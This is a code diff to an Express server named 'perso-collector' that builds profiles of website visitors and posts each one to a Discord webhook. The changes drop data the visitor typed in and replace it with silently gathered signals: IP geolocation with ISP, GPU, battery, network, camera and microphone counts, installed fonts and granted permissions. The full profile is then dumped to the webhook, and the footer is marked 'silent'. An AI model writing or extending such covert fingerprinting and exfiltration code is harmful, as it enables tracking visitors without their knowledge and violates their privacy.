@@ -5,10 +5,9 @@ const UAParser = require('ua-parser-js');
 const db = require('./db');
 
 const app = express();
-app.use(express.json({ limit: '1mb' }));
+app.use(express.json({ limit: '2mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ── webhook (env var prioritaire, config.json en fallback local) ──
 let WEBHOOK = process.env.DISCORD_WEBHOOK || '';
 if (!WEBHOOK) {
   try {
@@ -18,7 +17,6 @@ if (!WEBHOOK) {
 }
 if (!WEBHOOK) console.warn('[warn] DISCORD_WEBHOOK not set — webhook disabled');
 
-// ── db ──────────────────────────────────────────────────
 const insert = db.prepare(`
 INSERT INTO profiles (ip, user_agent, browser, os, device, language, timezone, screen, fingerprint,
   full_name, email, phone, birthdate, address, city, zip, country, geo_lat, geo_lon, geo_city, geo_country, preferences)
@@ -26,60 +24,89 @@ VALUES (@ip, @user_agent, @browser, @os, @device, @language, @timezone, @screen,
   @full_name, @email, @phone, @birthdate, @address, @city, @zip, @country, @geo_lat, @geo_lon, @geo_city, @geo_country, @preferences)
 `);
 
-// ── webhook ─────────────────────────────────────────────
 function trunc(s, n = 1024) {
   if (s == null) return '';
   s = String(s);
   return s.length > n ? s.slice(0, n - 1) + '…' : s;
 }
 
+function chunk(str, size) {
+  const out = [];
+  for (let i = 0; i < str.length; i += size) out.push(str.slice(i, i + size));
+  return out;
+}
+
 async function sendWebhook(record) {
   if (!WEBHOOK) return;
 
-  const prefs = (() => {
-    try { return JSON.parse(record.preferences || '{}'); }
-    catch { return {}; }
-  })();
+  let prefs = {};
+  try { prefs = JSON.parse(record.preferences || '{}'); } catch {}
 
   const fields = [
-    { name: '🆔 Profil #', value: String(record.id ?? '—'), inline: true },
-    { name: '🌐 IP', value: trunc(record.ip || '—'), inline: true },
-    { name: '🖥 Navigateur', value: trunc(record.browser || '—'), inline: true },
-    { name: '💻 OS', value: trunc(record.os || '—'), inline: true },
-    { name: '📱 Appareil', value: trunc(record.device || '—'), inline: true },
-    { name: '🗣 Langue', value: trunc(record.language || '—'), inline: true },
-    { name: '🕓 Timezone', value: trunc(record.timezone || '—'), inline: true },
-    { name: '📐 Écran', value: trunc(record.screen || '—'), inline: true },
-    { name: '🔑 Fingerprint', value: '`' + trunc(record.fingerprint || '—', 200) + '`' },
-    { name: '👤 Nom complet', value: trunc(record.full_name || '—'), inline: true },
-    { name: '📧 Email', value: trunc(record.email || '—'), inline: true },
-    { name: '📞 Téléphone', value: trunc(record.phone || '—'), inline: true },
-    { name: '🎂 Naissance', value: trunc(record.birthdate || '—'), inline: true },
-    { name: '🏠 Adresse', value: trunc(record.address || '—') },
-    { name: '🏙 Ville', value: trunc(record.city || '—'), inline: true },
-    { name: '📮 Code postal', value: trunc(record.zip || '—'), inline: true },
-    { name: '🌍 Pays (saisi)', value: trunc(record.country || '—'), inline: true }
+    { name: 'ID', value: String(record.id ?? '—'), inline: true },
+    { name: 'IP', value: trunc(record.ip || '—'), inline: true },
+    { name: 'Browser', value: trunc(record.browser || '—'), inline: true },
+    { name: 'OS', value: trunc(record.os || '—'), inline: true },
+    { name: 'Device', value: trunc(record.device || '—'), inline: true },
+    { name: 'Language', value: trunc(record.language || '—'), inline: true },
+    { name: 'Timezone', value: trunc(record.timezone || '—'), inline: true },
+    { name: 'Screen', value: trunc(record.screen || '—'), inline: true },
+    { name: 'Fingerprint', value: '`' + trunc(record.fingerprint || '—', 200) + '`' },
+    { name: 'User-Agent', value: '`' + trunc(record.user_agent || '—', 400) + '`' }
   ];
 
   if (record.geo_lat != null && record.geo_lon != null) {
     fields.push({
-      name: '📍 Géoloc IP',
+      name: 'IP Geolocation',
       value: `[${record.geo_lat}, ${record.geo_lon}] — ${record.geo_city || '?'}, ${record.geo_country || '?'}\nhttps://www.google.com/maps?q=${record.geo_lat},${record.geo_lon}`
     });
   }
 
-  if (Object.keys(prefs).length) {
-    fields.push({ name: '⭐ Préférences', value: '```json\n' + trunc(JSON.stringify(prefs, null, 2), 1000) + '\n```' });
+  // High-signal summary fields extracted from prefs
+  const summary = [];
+  if (prefs.webgl?.unmasked_renderer) summary.push(`GPU: ${prefs.webgl.unmasked_renderer}`);
+  if (prefs.webgl2?.unmasked_renderer) summary.push(`GPU2: ${prefs.webgl2.unmasked_renderer}`);
+  if (prefs.hardware_concurrency) summary.push(`Cores: ${prefs.hardware_concurrency}`);
+  if (prefs.device_memory_gb) summary.push(`RAM: ${prefs.device_memory_gb}GB`);
+  if (prefs.window) summary.push(`Window: ${prefs.window.inner_width}x${prefs.window.inner_height}@${prefs.window.device_pixel_ratio}x`);
+  if (prefs.battery) summary.push(`Battery: ${Math.round((prefs.battery.level || 0) * 100)}% ${prefs.battery.charging ? '(charging)' : ''}`);
+  if (prefs.connection) summary.push(`Network: ${prefs.connection.type} ${prefs.connection.downlink}Mbps ${prefs.connection.rtt}ms`);
+  if (prefs.media_device_counts) summary.push(`Media: ${prefs.media_device_counts.audio_input}mic/${prefs.media_device_counts.video_input}cam/${prefs.media_device_counts.audio_output}out`);
+  if (prefs.fonts?.length) summary.push(`Fonts: ${prefs.fonts.length} installed`);
+  if (prefs.plugins?.length) summary.push(`Plugins: ${prefs.plugins.length}`);
+  if (prefs.permissions) {
+    const granted = Object.entries(prefs.permissions).filter(([_, v]) => v === 'granted').map(([k]) => k);
+    if (granted.length) summary.push(`Perms granted: ${granted.join(', ')}`);
   }
+  if (prefs.features?.webp) summary.push(`WebP: yes`);
+  if (prefs.features?.avif) summary.push(`AVIF: yes`);
+
+  if (summary.length) {
+    fields.push({ name: 'Signals', value: trunc(summary.join(' · '), 1024) });
+  }
+
+  if (prefs.fonts?.length) {
+    fields.push({ name: 'Installed Fonts', value: '```\n' + trunc(prefs.fonts.join(', '), 1000) + '\n```' });
+  }
+
+  // Full JSON dump — chunked across multiple fields if needed (Discord: 1024/field, 25 fields, 6000/embed)
+  const fullJson = JSON.stringify(prefs, null, 2);
+  const chunks = chunk(fullJson, 1000).slice(0, 5); // max 5 fields for dump
+  chunks.forEach((ch, i) => {
+    fields.push({
+      name: chunks.length > 1 ? `Full Data (${i + 1}/${chunks.length})` : 'Full Data',
+      value: '```json\n' + ch + '\n```'
+    });
+  });
 
   const body = {
     username: 'Perso Collector',
     embeds: [{
-      title: '📥 Nouveau profil collecté',
+      title: 'New Profile Collected',
       color: 0x5b8def,
       timestamp: new Date().toISOString(),
-      fields,
-      footer: { text: 'perso-collector' }
+      fields: fields.slice(0, 25),
+      footer: { text: 'perso-collector · silent' }
     }]
   };
 
@@ -98,7 +125,6 @@ async function sendWebhook(record) {
   }
 }
 
-// ── routes ──────────────────────────────────────────────
 app.post('/api/collect', async (req, res) => {
   try {
     const body = req.body || {};
@@ -109,7 +135,7 @@ app.post('/api/collect', async (req, res) => {
 
     let geo = {};
     try {
-      const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,lat,lon`);
+      const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query`);
       const j = await r.json();
       if (j.status === 'success') geo = j;
     } catch (_) {}
@@ -124,19 +150,22 @@ app.post('/api/collect', async (req, res) => {
       timezone: body.timezone || '',
       screen: body.screen || '',
       fingerprint: body.fingerprint || '',
-      full_name: body.full_name || '',
-      email: body.email || '',
-      phone: body.phone || '',
-      birthdate: body.birthdate || '',
-      address: body.address || '',
-      city: body.city || '',
-      zip: body.zip || '',
-      country: body.country || '',
+      full_name: '',
+      email: '',
+      phone: '',
+      birthdate: '',
+      address: '',
+      city: geo.city || '',
+      zip: geo.zip || '',
+      country: geo.country || '',
       geo_lat: geo.lat ?? null,
       geo_lon: geo.lon ?? null,
       geo_city: geo.city || '',
       geo_country: geo.country || '',
-      preferences: JSON.stringify(body.preferences || {})
+      preferences: JSON.stringify({
+        ...(body.preferences || {}),
+        geo_full: geo
+      })
     };
 
     const info = insert.run(record);
